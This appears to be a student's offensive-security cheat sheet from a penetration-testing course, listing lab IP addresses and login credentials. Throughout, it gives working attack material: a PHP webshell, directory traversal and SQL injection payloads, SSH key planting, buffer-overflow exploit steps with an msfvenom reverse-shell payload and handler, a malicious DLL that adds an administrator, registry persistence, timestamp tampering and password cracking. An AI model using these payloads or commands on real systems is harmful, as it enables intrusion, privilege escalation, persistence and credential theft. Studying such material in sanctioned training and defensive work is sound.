
Usr: DABR-003-M		10.50.38.173
Pwd: IMO2qzSSbZMCdWv	
Piv: 10.50.35.227

http://10.50.22.9:8000/

winops: 192.168.65.10, 10.50.25.36    xfreerdp /u:student /v:10.50.25.36 /dynamic-resolution +glyph-cache +clipboard
linops: 192.168.65.20, 10.50.32.167   ssh -X student@10.50.32.167
creds: student // password

nmap --min-rate 80000
hostname
sudo -l

## python server
python3 -m http.server		# make python server in dir on lin ops
# using web browser on target connect to lin ops IP:port given

###### System Recon

cat /etc/os-release   # os ver
lsb_release -a    # more os ver
uname -a    # kernel ver
hostnamectl   # kernel & os ver
# can be used in https://www.exploit-db.com/ to find exploites

3389 = windows rdp
may need /cert-ignore in the xfreerdp command


## webpage scraping python script:
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')   # 

print ('Authors: ',authors)
# script end

## Scanning
1) Host Discovery
for i in {1..254}; do (ping -c 1 <first.three.oct>.$i | grep "bytes from" &) 2> /dev/null ;done   # ping sweep in bash
2) Host Enumeration
nmap <ip> -p- -T4   # quick scans all ports, use -Pn when using proxychains
3) Host Interrogation
nmap <ip> -Pn -T4 -sV -p <ports>   # grabs version of service on ports for service validation, or use --script=banner.nse instead of -sV

## nmap scripts
cat /usr/share/nmap/scripts/<scriptName>    # shows more information on script
nmap -Pn -T4 <ip> --script=<scriptName> -p <ports>    # runs a nmap script
nmap -Pn -T4 <ip> --script="<catName>" -p <ports>    # runs all nmap scripts that have the "catName" catagory


###### Web Exploitation

GET = Request info
POST = sending info (i.e. login creds)

# f12 to open dev window when on a web page
# can run functons by typing <function>() in the dev console

wget -r -l2 -P /tmp <ip>   # -r=recursive, -l2=2 levels deep, -P=copy to location
curl -o example.html http://www.website.com/    # specify different destination name

# good nmap http scripts: hht-enum.nse, http-robots.txt.nse

# robots.txt shows webcrawlers what and what not to index, lists posible web directories

nikto -h <ip>   # shows web directories that exist

## Directory Traversal
../../../../../../../../etc/passwd    # typed into searchboxes to try to navigate to root and then to desired directory
# dirs to try: 
/etc/passwd   # user information: loginshell (i.e. /bin/bash), home dir location (i.e. /root)
/etc/group    # user groups: root, adm, sudo (the good ones)
/etc/hosts    # ip's that hosts are maped to: shows ip's of interest(i.e. 192.168.18.1 webserver)
/etc/resolv.conf    # DNS server: shows ip networks we can scan for
/etc/networks   # 

# in dev console under 'network' under header of get request:
  myfile
	  somestuff
  submit
	  File look up
# does directory travel in one line: 
http://10.50.34.135/siteWithSearchbar.php?myfile=../../../../../etc/passwd&submit=File+look+up

## Malicious File Upload (Webshell)
# must be able to upload, file extensions must not be sanitized, must be able to access upload directory

nano webshell.php
  <HTML><BODY>
  <Form METHOD="GET" NAME="badform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="hello">
  </Form>
  <?php system($_GET['cmd']);?>
  </BODY></HTML>

# upload this file ^ and navigate to "uploads" (or wherever web directory file was uploded to)
id    # or whoami to see if it worked

## Command Injection
# for input that run commands
; id    # enter in searchbar to verify that it works

## SSH Keys
# Pair with either Command Injection or Webshell

1) generate SSH Keys on whichever host you plan on logging in from, 
ssh-keygen -t rsa -b 4096		# generate keys

cat /home/student/.ssh/id_rsa.pub		# show your ssh key

2) Determine the user on the webserver
whoami (through Command Injection or Webshell)

3) Determine the user's home directory
/etc/passwd (again through Command Injection or Webshell)
# in this example the users home dir is /var/www

4) Determine if .ssh/ dir exists in the users home dir, if not create it
ls -la /var/www
# if its not there...
mkdir /var/www/.ssh		# creates ssh dir, use ls again to make sure it has been created

5) Inject our key into the authorized_keys file
echo "<your Key here>" > /var/www/.ssh/authorized_keys		# insert your ssh key from step 1

cat /var/www/.ssh/authorized_keys		# to check that key is there

6) Login from the workstation you generated the key from
ssh <username>@<ip>

## webservers default directory
http://10.50.34.125/ = /var/www/html		# this is NOT where we put .ssh


###### SQL Injection

mysql		# start SQL, can use ' --user=<usr> --pass=<pword> ' to specify a user
# SQL is organized: Database -{ Table -{ Column

show databases;		# shows databases that exist on system
# Defaul Databases:
	information_schema = Database of databases, meta data
	mysql = Config, user info
	performance_schema = status info

show tables from <database>;		# shows tables from selected database

select <column> from <database>.<table>;		# shows selected column from specified list, use * to grab all columns
# use 'UNION' between commands to join them together, output must be similar
#	tb1 has two less colums than tb2 in this example:
select *,null,null from db1.tb1 UNION select * from db1.tb2;		# adds 2 temp colums to tb1

describe <database>.<table>;		# shows columns field types

SELECT <column> FROM <db>.<tbl> WHERE <condition>		# use 'WHERE' to add a condition:	
	=, !=, < <=, >, >=		Standard numerical operators													col_name != 4
	BETWEEN … AND …				Number is within range of two values (inclusive)			col_name BETWEEN 1.5 AND 10.5
	NOT BETWEEN … AND …		Number is not within range of two values (inclusive)	col_name NOT BETWEEN 1 AND 10
	IN (…)								Number exists in a list																col_name IN (2, 4, 6)
	NOT IN (…)						Number does not exist in a list												col_name NOT IN (1, 3, 5)
https://sqlbolt.com/lesson/select_queries_with_constraints		# more info here
... where table_schema='session'		# or whatever db is relevent

## unsanitized POST fields
enter password: dan' OR 1='1		# passes a TRUE bool through the password check system
	<value>' or 1='1				# stantard TRUE bool
	<value>' or 1='1;				# TRUE with end line char
	<value>' or 1='1; #			# TRUE with end line and comment out
	<value>' or 1='1; --		# same as above
	
# if vuln, get raw request from network dev tab and add that to url
http://10.50.21.144/login.php?usrNameVar=dan' or 1='1&pwordVar=dan' or 1='1

# when working with a web SQL table find # of rows & columns and start with the lowest
	Rows:5
	Columns:4
# try all of these and if they do not work add another number (i.e. select 1,2,3,4,5) to determine the # of columns
Audi' UNION select 1,2,3,4		# in this case Audi is a vaule that works with unsanitized POST field stuff above
Audi' UNION select 1,2,3,4;
Audi' UNION select 1,2,3,4; #
Audi' UNION select 1,2,3,4; --
Audi' UNION select 1,2,3,4,5; #		# command that works, in this example there are 5 columns and column 2 is hidden

# Golden Statement: select table_schema,table_name,column_name from information_schema.columns
# table_schema = list of Databases | table_name = list of tables | column_name = list of columns

Audi' Union select table_schema,2,table_name,column_name,5 from information_schema.columns; #
# 2 is inserted bc its hidden & 5 is tacked on to fill in the requied num of fields
# from this list find database, tabels and columns of interest and pull them:
Audi' UNION select id,2,name,pass,5 from session.user; #

## unsanitized GET fields
# must have .php, look under "network" > "Request" for username & pword variable names
http://10.50.21.144/login.php?usrNameVar=dan' or 1='1&pwordVar=dan' or 1='1		# get request using TRUE bool

# same as POST, find an unsanitized field, '' are not always needed
http://10.50.21.144/uniondemo.php?Selection=1&Submit=Submit		# normal url
http://10.50.21.144/uniondemo.php?Selection=1 or 1=1&Submit=Submit		# injected url, try all selections (1;|1; #|1; --)
# start fuzzing from lowest num, columns in this case
	Rows: 5
	Columns: 3
http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3&Submit=Submit		# inserted ' UNION select 1,2,3 ' and nums until it works
# determine the amount of columns (3 in this example) and hidden columns (none in this example)
# use Golden Statement again: select table_schema,table_name,column_name from information_schema.columns
http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,table_name,column_name from information_schema.columns&Submit=Submit
# don't get lost in the sause ;)

# can load files with SQL with: load_file('/etc/passwd')
http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,load_file('/etc/passwd')&Submit=Submit
# @@version can be used the same way to get SQL version number


###### Reverse Engineering

# There are 16 General Registers:
	# Accumulator register(AX) used for arithmetic operations
	# Counter register(CX). Used ifor shift instructions and loops.
	• Data register (DX). Used in arithmetic operations and I/O operations.
	• Base register (BX). Used as a pointer to data
	• Stack Pointer register (SP). Pointer for the top of the stack.
	• Stack Base Pointer register (BP). pointer for base of the stack.
	• Source Index register (SI). pointer to a source in stream operations.
	• Destination Index register (DI). pointer to a destination in stream operations

# Assembly syntax:
<Instruction> <Operand1>,<Operand2>		
	# Operands can be a Hex val (0x3), a Register (eax), or a memory address (0x0000001)
	# Instructions:
		Data Movement/Sorage: MOV <dst>,<src> | LEA
		Arithmetic:						ADD <dst>,<src> | SUB <dst>,<src> | INC <dst> | DEC <dst> | MUL <dst>,<src> | DIV <dst>,<src>
		Logic: 								OR | AND | XOR | SHR | SHL
		Stack: 								PUSH <src> (onto top of stack)| POP <dst> (from top of stack)| CALL | RET
		Control Flow: 				TEST | CMP (Compare Op1-Op2->FlgReg) | JMP <dst> | JLE <dst> (Jump if FlgReg <=)

## C stuff
fgets(str, int, stream)		# reads line from specifed stream and stores it
strcmp(str1, str2)		# compares string 1 to string 2
atoi(char)		# ascii to interger
strtok(string)		# splits string on white space
scanf()		# reads from stdin

https://www.tutorialspoint.com/cprogramming/index.htm

## actual Analysis
file <filename>		# tells us what kind of exe the file is
strings -n 10 <filename> | less		# text in exe, skim through for stuff of interest, "10" is min num of char
gdb <filename>		# open gdb prompt
	# GDB commands:
		disass main
	# GDB-peda
		pdisass main

## Ghidra
file > new project > non-shared project > C:\Users\student > COSC22003 > Finish
file > import file or import (I) > demo.exe
search > for string > filter > "enter key"


right click > patch instruction		# patch stuffffff
file > export program > binary > <renamefile> > ok > (on windows) remove .bin extention & run


###### Exploit Development

gdb on remote system is required
find vulrable binnary
run program see what values it takes
program can take: input(enter value:) or paramaters(./program paramater)

## GDB Stuff
gdb <program>		# starts gdb-peda
peda$> pdisass main
peda$> pdisass <function>		# look for red functions that you can use buffer overflow on
wiremask.eu > tools > copy pattern into program
peda$> run <<< <input>
find EIP registar value, copy hex into wiremask, get offset
# make python script
	buff = "A" * 62		# fills buffer
	eip = "B" * 4		# place holder for exploite
	print(buff + eip)

peda$> run <<< $(python buff.py) 		# sends script to input

env - gdb <program>		# starts plane jane gdb
gdb> show env		# shows env variables
gdb> unset env <variable>		# unset listed variable, do for all listed with show 
gdb> run		# run program and overflow it with trash
gdb> info proc map		# shows mem values
gdb> find /b <fist mem addr after [heap]>, <second mem addr on [stack]>, 0xff, 0xe4		# finds jump vals between the start & end of heap 
# if error, use mem addr directly above second value (^ this one)
# copy a few from the middle and past into script as a comment for reference
nop = '\x90' * 10		# add to script (optional), no op slead for safty reasons, add var to print statement aswell
# enter reverse byte mem value for one jump val as eip in script (see below)
	eip = '/x33/x97/xf6/xf7'		# if value is 0xf7f69733 split on bytes: 0xf7 f6 97 33 and reverse

msfvenom -p linux/x86/exec cmd="whoami" -b '\x00' -f python		# make payload, copy and past result into script
	# operating sys ^ | command ^ | bad instructions ^ | format ^
print(buff + eip + nop + buf)		# add 'buf' to print statement in script

./<program> <<< $(python <script.py)		# save script and run on program
./<program> $(python <script.py)		# use this instead if program takes parameter instead of input
# if works change payload  to something usefull (like cat <file>) and run again

## in windows...
https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
write socket script
open program in immunity debugger
run wiremask in socket script on port and view EIP in debugger
	!mona jmp -r ESP -m "<dllFile>.dll"		# in debugger to find jump value
msfvenom -p windows/shell_reverse_tcp LHOST=<my IP> LPORT=5555 -b '\x00' -f python
msfconsole
	use multi/handler
	set payload windows/shell_reverse_tcp
	set lhost 0.0.0.0
	set lport 5555
	exploit
# dir = ls | type = cat |

net user /add <username> <password>
net localgroup administrators <username> /add


###### Post Exploitation

## some ssh socket shit
ssh -M -S /tmp/s <usr>@<IP>		# 
ssh -o '/tmp/s' a		# 

nano ~/.ssh/config

ssh -o ControlPath='~/.ssh/cm/student@localhost:1111'

ss -ntlp		# kill the pid of 9050 to kill dynamic tunnels

## user enum
net user
cat /etc/passwd
# Zuse is another name for root and is probably vulnarable
# adding users on windows...
net user [UserName] [password] /add		# Add New User  (use * for password for a prompt to enter password securely)
net user [UserName[ /active:no		# Disable User Account
net localgroup "Power Users" /add moe		# Add user moe to the local group Power Users
# remote desktop users and administrators are useful groups on windows

## process enum
tasklist/v
ps -elf		# security products to look out for: kaspersky & rkhunter & rsyslog(remote logging)

## service enum
tasklist /svc
chkconfig

## network enum
ipconfig /all
ipconfig -a
ip a

3389 = windows rdp

###### lunux priv exc

/etc/sudoers		# stores users with sudo permissions
	<userName> ALL=(ALL:ALL) ALL		# entry gives max sudo permissions for given user
sudo -l		# shows what you can run as sudo, look for non standard binaries
sudo cat -> read /etc/shadow
sudo vi -or- vim -> run bash

find / -perm /4000 2>/dev/null		# shows files with suid bit set
find / -type f -perm /2000 2>/dev/null		# shows files with sgid bit set
gtfobins.github.io		# look through above stuff for somethng you can exploite

echo $PATH		# if starts with '.' then will default to local dir
# make script named after a command that has '#!/bin/bash' and the commands you want to run, chmod +x it

## cron stuff
crontab -l		# shows cron, can use sudo for root's
cd /etc/cron		# look for sussy crons being ran as root
crontab.guru		# shows how to make crons (website)

touch -c -t 201603051015 1.txt		# change timestamps
touch -r 3.txt 1.txt		# copy timestamp

/etc/rsyslog.d/*		# syslog config, may also be in /etc/rsyslog.conf

## john
sudo apt install john		# download john
# copy entire line from /etc/shadow into another file
john --wordlist=rockyou.txt <fileWithHashs>		# how to start cracking, rockyou.txt is a wordlist


###### Win Priv Esc

# Schedule Tasks
	# Binary Replacement
	# DLL Hijacking
# Services
	# Binary Replacement
	# DLL Hijacking
	
# Windows Access Control Model
	# Access Tokens (users): Roles, Permissions, Rights
	# Security Descriptors (Files):
		# DACL - Discretionary Access Control List, rules on the file
		# SACL - System Access Control List, auditing on the file
		# ACES - Access Controls Entries, entries of what to audit on the file inside of the SACL

## Scheduled Tasks Bin Replace
Schedule Tasks	# check schld tasks app for tasks with these flags...
	General Tab: Security Options = SYSTEM
	Trigger Tab: Trigger = At Log On | Status = Enabled
	Ations Tab: Action = Start a program		# replace .exe with a shell script if you have permission to do so
shutdown /r /f /t 00		# restarts windows, may take several tries
xfreerdp /u:thor /v:10.50.25.36 /dynamic-resolution +glyph-cache +clipboard		# log in as new user, use user in script, make sure ip is right too

## Services Bin Replace
Services		# check Services app for services with these flags...
	Log On As: Local System
	Start Type: Automatic
	Decription: Blank (indicates third-party service)
right click service -> view properties
	Path to executable		# replace .exe with a shell script if you have permission to do so
shutdown /r /f /t 00		# restarts windows, may take several tries
xfreerdp /u:thor /v:10.50.25.36 /dynamic-resolution +glyph-cache +clipboard		# log in as new user, use user in script, make sure ip is right too

## DLL Hijacking
# if unable to swap .exe but can still write to file...
net use * \\live.sysinternals.com\tools		# in cmd, maps sysinternal tools to next available drive
Procmon.exe		# run procmon after moving to drive, may need to -accepteula
	Filter
		Process Name - contains - <process name> - include
		Result - contains - NOT - include
		Path - contains - .dll - include
run the process		# and observe "NAME NOT FOUND" .dll's
# Install Tools on Linux Machine and create malicious .dll 
	sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-tools mingw-w64-x86-64-dev -y
	nano <vuln dll name>.c
	
### dll script ###
#include <windows.h>
int execCommand()
{
 WinExec("cmd /C net localgroup \"Administrators\" /add comrade", 1);		// makes user comrade an admin, can change code to do whatever, may need to add to "Remote Desktop User"
 return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 execCommand();
 return 0;
}
### end of dll script ###

# compile & make dll:
	i686-w64-mingw32-g++ -c SSPICLI.c -o SSPICLI.o
	i686-w64-mingw32-g++ -shared -o SSPICLI.dll SSPICLI.o -Wl,--out-implib,SSPICLI.a
scp ./<ddlName>.dll <user>@<IP>:<to\location>		# copy to dir where .exe is
shutdown /r /f /t 00		# done on windows box, restarts windows and runs script

## DLL stuff
C:\Windows C:\Windows\System32		# where most DLL's are located
# DLL search order:
	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs ->
	dir that App was run from -> dir in the C+ function GetSystemDirectory() -> dir in the C+ function GetWindowsDirectory() -> The current dir
# Windows Integrity Mechanism:
	Untrusted - Anonymous SID access tokens
	Low - Everyone SID access token (World)
	Medium - Authenticated Users
	High - Administrators
	System - System services (LocalSystem, LocalService, NetworkService)

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System		# check UAC settings, look at EnableLUA 1=on, 0=off

# File Manifest
	# Requested Execution Level: asInvoker, highestAvailable, asAdministrator
	# AutoElevate: True or N/A		# elevates priv to run programs that require it
net use * \\live.sysinternals.com\tools		# maps sysinternal tools to next available drive
sigcheck.exe -m C:\Windows\System32\eventvwr.exe | findstr /i level		# finds ExecutionLevel of eventvwr
sigcheck.exe -m C:\Windows\System32\eventvwr.exe | findstr /i autoelevate		#	finds autoElevate of eventvwr

## persistance
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run		# or RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run		# or RunOnce

## logs :(
auditpol /get /category:*		# in cmd, shows what is being logged
# important event ID's
	4624/4625 successful/failed login, 4720 account created, 4672 administrator equivalent user logs on, 7045 Service creation




